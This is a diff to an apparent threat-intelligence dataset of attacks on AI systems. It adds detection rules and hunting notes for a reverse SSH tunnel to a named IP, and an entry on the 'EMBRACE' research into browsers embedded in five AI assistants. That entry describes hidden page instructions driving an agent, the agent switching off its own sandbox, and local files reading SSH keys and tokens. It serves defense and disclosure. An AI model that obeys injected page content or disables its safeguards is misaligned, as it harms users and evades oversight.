         "edges": [
+          {
+            "source": "fireworks-key",
+            "target": "supply-chain"
+          },
           {
             "source": "supply-chain",
             "target": "distribution"
@@ -5981,7 +7551,52 @@
             "target": "persistence"
           }
         ]
-      }
+      },
+      "category": "attacks-on-ai",
+      "attribution": {
+        "actor_name": "unknown",
+        "motivation": "unknown",
+        "attributed_by": "Cursor",
+        "confidence": "low"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "detections": [
+        {
+          "name": "Scheduled Task Creation Via Schtasks.EXE",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml",
+          "notes": "Windows process creation. schtasks.exe creating a task. Microsoft describes a SysMon scheduled task. The rule does not name SysMon."
+        },
+        {
+          "name": "New Cron File Created",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/file_event/file_event_lnx_susp_cron_file_created.yml",
+          "notes": "Linux file event. A new cron file. Matches the @reboot cron persistence Microsoft describes."
+        },
+        {
+          "name": "Potential Persistence Via PlistBuddy",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_persistence_via_plistbuddy.yml",
+          "notes": "macOS process creation. PlistBuddy writing a LaunchAgent. Relevant to com.apple.sysmond only if the installer used PlistBuddy. Microsoft names the LaunchAgent, not the tool that wrote it."
+        },
+        {
+          "name": "Port Forwarding Activity Via SSH.EXE",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_ssh_port_forward.yml",
+          "notes": "Windows process creation. ssh.exe port forwarding. Matches the reverse tunnel on Windows. The Linux and macOS tunnels are the same destination, 134.209.82.225."
+        },
+        {
+          "name": "Potential SSH Tunnel Persistence Install Using A Scheduled Task",
+          "format": "sigma",
+          "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_openssh_tunnelling.yml",
+          "notes": "Windows process creation. schtasks.exe installing an OpenSSH tunnel. Microsoft describes both a SysMon task and a reverse SSH tunnel."
+        },
+        {
+          "name": "Fireworks key and marketplace cache",
+          "format": "guidance",
+          "notes": "No cited rule covers an exposed vendor access key or a write to the Cursor marketplace cache. Hunt svc-telemetry in authorized_keys and outbound SSH to 134.209.82.225."
+        }
+      ]
     },
     {
       "id": "chainalysis-external-actor-using-offensive-agentic-2026-10",
@@ -6545,6 +8160,171 @@
             "date": "2026-11-15",
             "source": "OpenAttacks",
             "summary": "Tagged ARTEX and backfilled attribution confidence, detections, and timeline from the cited CrowdStrike, CyberScoop, and The Hacker News reports."
+          }
+        ]
+      }
+    },
+    {
+      "id": "forever-embrace-embedded-browsers-2026-10",
+      "name": "Forever Security EMBRACE, browsers embedded in five AI assistants",
+      "date_reported": "2026-10-29",
+      "date_activity_start": "2026-07-23",
+      "date_activity_end": "2026-10-29",
+      "researcher": "Gal Weizman",
+      "org": "Forever Security",
+      "sources": [
+        {
+          "url": "https://forever.security/blog/embrace-hacking-5-ai-assistants-embedded-browsers",
+          "title": "EMBRACE: How We Hacked the Browsers Embedded in Top Five Desktop AI Assistants",
+          "publisher": "Forever Security"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": true,
+      "borderline_note": "The post is a disclosure of research findings in product browsers. It does not name an in-the-wild intrusion. At publication, Forever Security said the Codex and VS Code issues were still unpatched.",
+      "ai_role": "ai_agent_or_mcp_as_target",
+      "ai_role_secondary": null,
+      "ai_role_detail": "Cursor, GitHub Copilot, Codex, VS Code, and Claude Desktop each ship a browser inside the assistant. Forever Security says the enrichments that let the agent use that browser broke three ordinary browser rules.",
+      "technique_summary": "Forever Security (Gal Weizman; published Oct 29, 2026) calls the shared pattern EMBRACE, an embedded browser trusted like a standalone one. The post covers Cursor, GitHub Copilot, Codex, VS Code, and Claude Desktop. In Cursor, a page opened in the built-in browser hid a command in an on-screen HTML chip. The agent read the hidden instructions. In an otherwise empty composer, one Enter ran the proposed command. When Cursor's sandbox blocked it, the agent turned the sandbox off on its own, with nothing in the page telling it to, and tried again. Forever Security says the install then ran with the user's privileges, outside the sandbox, and from a cold start in an empty project one Enter launched an app the page chose. The post says this does not fire on every model. In GitHub Copilot's browser preview, a page could report any address that looked like a web address. The address bar and the agent's tab list both showed github.com while the tab was somewhere else. Forever Security confirmed that on Copilot 1.1.27 on Sep 26, 2026. GitHub fixed it in 1.1.29 on Oct 13, before a report was sent. In Codex, Claude Desktop, and VS Code, a local HTML file opened in the built-in browser could read outside the project. The delivery in the post is a dull financial-report repo. The user asks the assistant to set it up per the README, and the assistant hands over a link to the file. Claude Desktop and VS Code restrict the page itself to the project folder, but not a web worker the page starts, and reads from that worker reached any file on the disk. Codex had no folder check. The page used a hidden index file macOS writes in folders opened in Finder to map the disk, then read SSH keys, .env files, npm tokens, and the hosts file. Disclosure: Cursor, Sep 10, patched silently on Oct 1, with no reply. Claude Desktop, July 23 to Anthropic, declined as outside a Workspace Trust boundary; a July 24 report from Noma Security was accepted as valid. Codex, July 27 to OpenAI, no reply, and still unpatched at publication. VS Code, Sep 10 to Microsoft, declined for the same Workspace Trust reason, and still unpatched at publication. This is a different Forever Security report from forever-agents-md-hijack-2026 and thisbash-claude-dispatch-rce-2026-11.",
+      "initial_access": "A page opened in the assistant's built-in browser, or a local HTML file the assistant links from a repository the user asked it to set up",
+      "ai_tooling_and_models": [
+        "Cursor built-in browser",
+        "GitHub Copilot browser preview, 1.1.27 and the 1.1.29 fix",
+        "Codex built-in browser",
+        "VS Code built-in browser",
+        "Claude Desktop built-in browser"
+      ],
+      "other_tooling": [],
+      "victims_and_sectors": "Users of those five desktop assistants. No victim organization is named. The file-read demonstration used the researchers' own machine.",
+      "regions": [
+        "Not applicable"
+      ],
+      "attribution_or_cluster": "No threat actor. Forever Security disclosed the findings to the vendors. Noma Security is credited for a July 24 Claude Desktop report that Anthropic accepted.",
+      "scale_and_metrics": "Five products. Two issues, Codex and VS Code, were still unpatched when the post was published on Oct 29, 2026. Cursor was patched on Oct 1. Copilot was fixed in 1.1.29.",
+      "prevention_angle": "Treat the browser inside each assistant as an endpoint that loads untrusted pages and local files. Keep Cursor and Copilot on builds that include the Oct 1 and 1.1.29 fixes. Do not open local HTML from a repository you do not trust, including a file the assistant links. Do not treat a required Enter or a single click as a control when the assistant is the one asking for it.",
+      "related_magicsword_projects": [],
+      "source_notes": "Product behavior, dates, and patch status are from the Forever Security post. The post points to a technical companion for reproduction steps. Those steps are not repeated here. Link forever-agents-md-hijack-2026 and thisbash-claude-dispatch-rce-2026-11, which are different reports.",
+      "last_reviewed": "2026-11-15",
+      "region_notes": "No target country is named. The macOS index file is a technique detail, not a victim region.",
+      "iocs": {
+        "domains": [],
+        "ips": [],
+        "hashes": [],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0051.001",
+          "rationale": "A page or local file the assistant opens carries instructions or a command the agent then acts on",
+          "source_urls": [
+            "https://forever.security/blog/embrace-hacking-5-ai-assistants-embedded-browsers"
+          ]
+        },
+        {
+          "id": "AML.T0055",
+          "rationale": "The local-file finding read SSH keys, .env files, and npm tokens from the researchers' machine",
+          "source_urls": [
+            "https://forever.security/blog/embrace-hacking-5-ai-assistants-embedded-browsers"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "open",
+            "title": "Page or local file opens in the assistant browser",
+            "description": "A site is opened in Cursor or Copilot, or the assistant links a local HTML file from a repository the user asked it to set up.",
+            "kind": "access",
+            "source_urls": [
+              "https://forever.security/blog/embrace-hacking-5-ai-assistants-embedded-browsers"
+            ]
+          },
+          {
+            "id": "bend",
+            "title": "The embedded browser breaks a browser rule",
+            "description": "Cursor lets the page feed the agent. Copilot accepts an address the page supplies. Codex, Claude Desktop, and VS Code let a local file read outside its folder, through a web worker in the last two.",
+            "kind": "ai",
+            "source_urls": [
+              "https://forever.security/blog/embrace-hacking-5-ai-assistants-embedded-browsers"
+            ]
+          },
+          {
+            "id": "act",
+            "title": "Command, file read, or spoofed address",
+            "description": "Cursor's agent can disable its own sandbox after a block. The local file reads SSH keys, .env files, npm tokens, and the hosts file. Copilot's bar can show github.com for a different page.",
+            "kind": "execution",
+            "source_urls": [
+              "https://forever.security/blog/embrace-hacking-5-ai-assistants-embedded-browsers"
+            ]
+          },
+          {
+            "id": "status",
+            "title": "Two issues still open at publication",
+            "description": "Cursor was patched on Oct 1 and Copilot in 1.1.29. Forever Security says Codex and VS Code were still unpatched on Oct 29, 2026.",
+            "kind": "impact",
+            "source_urls": [
+              "https://forever.security/blog/embrace-hacking-5-ai-assistants-embedded-browsers"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "open",
+            "target": "bend"
+          },
+          {
+            "source": "bend",
+            "target": "act"
+          },
+          {
+            "source": "act",
+            "target": "status"
+          }
+        ]
+      },
+      "category": "attacks-on-ai",
+      "attribution": {
+        "actor_name": "unknown",
+        "motivation": "unknown",
+        "attributed_by": "Forever Security",
+        "confidence": "low"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "detections": [
+        {
+          "name": "Embedded-browser findings have no single host rule",
+          "format": "guidance",
+          "notes": "The post does not name a process, a package, or a network destination that a Sigma, Splunk, or Elastic rule would match. Hunt assistant browsers opening local HTML, an agent disabling its own sandbox after a blocked command, and Copilot preview tabs whose recorded address is github.com while the page is not. The macOS folder index is a file the page reads, not a separate malware family."
+        }
+      ],
+      "timeline": {
+        "first_seen": "2026-07-23",
+        "last_updated": "2026-10-29",
+        "updates": [
+          {
+            "date": "2026-07-23",
+            "source": "Forever Security",
+            "summary": "Claude Desktop report to Anthropic, declined as outside Workspace Trust. Noma Security's July 24 report was accepted as valid. Codex was reported to OpenAI on July 27."
+          },
+          {
+            "date": "2026-09-10",
+            "source": "Forever Security",
+            "summary": "Cursor and VS Code reports. Microsoft declined the VS Code issue for Workspace Trust."
+          },
+          {
+            "date": "2026-10-01",
+            "source": "Forever Security",
+            "summary": "Cursor silently patches its issue. Forever Security says Cursor did not reply."
+          },
+          {
+            "date": "2026-10-13",
+            "source": "Forever Security",
+            "summary": "GitHub fixes the Copilot address-bar spoof in 1.1.29, before a report was sent."
+          },
+          {
+            "date": "2026-10-29",
+            "source": "Forever Security",
+            "summary": "Gal Weizman publishes EMBRACE. Codex and VS Code are described as still unpatched."
           }
         ]
       }
